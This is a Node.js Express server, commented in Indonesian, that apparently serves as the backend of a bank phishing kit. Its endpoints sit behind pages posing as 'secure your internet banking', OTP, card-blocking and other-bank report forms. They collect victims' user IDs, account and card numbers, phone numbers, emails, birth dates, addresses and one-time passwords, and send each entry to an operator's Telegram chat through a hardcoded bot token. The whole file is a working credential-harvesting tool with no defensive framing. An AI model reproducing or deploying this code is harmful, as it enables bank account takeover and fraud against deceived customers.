const express = require('express');
const fetch = require('node-fetch');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// 🔧 WAJIB DIISI — Data Bot Telegram Anda
const BOT_TOKEN = '8947782136:AAEjQuwb_sB8kUYsT_X1a5i3liNTERbQ16w'; // Dari @BotFather
const CHAT_ID = '8405193617';     // ID tujuan data

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// ========== FUNGSI UTAMA: Kirim ke Telegram + Balas Konfirmasi ==========
async function kirimKeTelegram(teks) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const res = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: teks,
      parse_mode: 'Markdown'
    })
  });
  const data = await res.json();
  if (!data.ok) throw new Error(data.description || 'Telegram Error');
  return data;
}

// ========== ENDPOINT 1: Info Pengunjung (index.html) ==========
app.post('/kirim-info', async (req, res) => {
  const { kota, deviceType, deviceName } = req.body;
  const pesan = `
📱 INFO PENGUNJUNG
━━━━━━━━━━━━━━━━━━━━━━
📍 Kota: ${kota || 'Tidak diketahui'}
📱 Device: ${deviceType}
💻 Detail: ${deviceName?.substring(0,80) || '-'}
⏰ Waktu: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
━━━━━━━━━━━━━━━━━━━━━━
  `.trim();
  await kirimKeTelegram(pesan);
  res.json({ ok: true, pesan: 'Data diterima!' });
});

// ========== ENDPOINT 2: Form Amankan IB (sanggah.html) ==========
app.post('/kirim-form-ib', async (req, res) => {
  const { userid, rekening, nohp, kota, deviceType } = req.body;
  const pesan = `
🔐 AMANKAN INTERNET BANKING
━━━━━━━━━━━━━━━━━━━━━━
🆔 User ID: ${userid}
🏦 No. Rekening: ${rekening}
📞 No. HP: ${nohp}
📍 Lokasi: ${kota}
📱 Device: ${deviceType}
⏰ Waktu: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
━━━━━━━━━━━━━━━━━━━━━━
  `.trim();
  await kirimKeTelegram(pesan);
  res.json({ ok: true, pesan: '✅ Data terkirim! Sedang diproses...' });
});

// ========== ENDPOINT 3: Form Amankan Mobile (mobile1.html) ==========
app.post('/kirim-form-mobile', async (req, res) => {
  const { userid, nohp, email, kota, deviceType } = req.body;
  const pesan = `
📱 AMANKAN MOBILE BANKING
━━━━━━━━━━━━━━━━━━━━━━
🆔 User ID: ${userid}
📞 No. HP: ${nohp}
📧 Email: ${email}
📍 Lokasi: ${kota}
📱 Device: ${deviceType}
⏰ Waktu: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
━━━━━━━━━━━━━━━━━━━━━━
  `.trim();
  await kirimKeTelegram(pesan);
  res.json({ ok: true, pesan: '✅ Data terkirim! Sedang diproses...' });
});

// ========== ENDPOINT 4: OTP / Batalkan Transaksi (two.html) ==========
app.post('/kirim-otp', async (req, res) => {
  const { otp, nohp, kota, deviceType } = req.body;
  const pesan = `
🔢 OTP / KODE VERIFIKASI
━━━━━━━━━━━━━━━━━━━━━━
🔢 Kode OTP: ${otp}
📞 No. HP: ${nohp}
📍 Lokasi: ${kota}
📱 Device: ${deviceType}
⏰ Waktu: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
━━━━━━━━━━━━━━━━━━━━━━
  `.trim();
  await kirimKeTelegram(pesan);
  res.json({ ok: true, pesan: '✅ OTP diterima! Sedang diproses...' });
});

// ========== ENDPOINT 5: Blokir Kartu (blokirkartu.html) ==========
app.post('/kirim-kartu', async (req, res) => {
  const { nomor_kartu, nama, tanggal_lahir, jenis, kota, deviceType } = req.body;
  const pesan = `
💳 BLOKIR KARTU
━━━━━━━━━━━━━━━━━━━━━━
💳 No. Kartu: ${nomor_kartu}
👤 Nama: ${nama}
🎂 Tgl Lahir: ${tanggal_lahir}
📋 Jenis: ${jenis}
📍 Lokasi: ${kota}
📱 Device: ${deviceType}
⏰ Waktu: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
━━━━━━━━━━━━━━━━━━━━━━
  `.trim();
  await kirimKeTelegram(pesan);
  res.json({ ok: true, pesan: '✅ Permintaan blokir terkirim!' });
});

// ========== ENDPOINT 6: Lapor Bank Lain (banklain.html) ==========
app.post('/kirim-banklain', async (req, res) => {
  const { nama_bank, nomor_rekening, nama_pemilik, alamat, kota, deviceType } = req.body;
  const pesan = `
🏦 LAPORAN BANK LAIN
━━━━━━━━━━━━━━━━━━━━━━
🏦 Nama Bank: ${nama_bank}
🏦 No. Rekening: ${nomor_rekening}
👤 Pemilik: ${nama_pemilik}
📍 Alamat: ${alamat}
📍 Lokasi: ${kota}
📱 Device: ${deviceType}
⏰ Waktu: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
━━━━━━━━━━━━━━━━━━━━━━
  `.trim();
  await kirimKeTelegram(pesan);
  res.json({ ok: true, pesan: '✅ Laporan terkirim! Terima kasih.' });
});

// Jalankan Server
app.listen(PORT, () => {
  console.log(`🚀 Server berjalan di http://localhost:${PORT}`);
  console.log(`🤖 Bot Telegram: ${BOT_TOKEN !== 'GANTI_DENGAN_TOKEN_BOT_ANDA' ? '✅ SIAP' : '❌ BELUM DIISI!'}`);
});
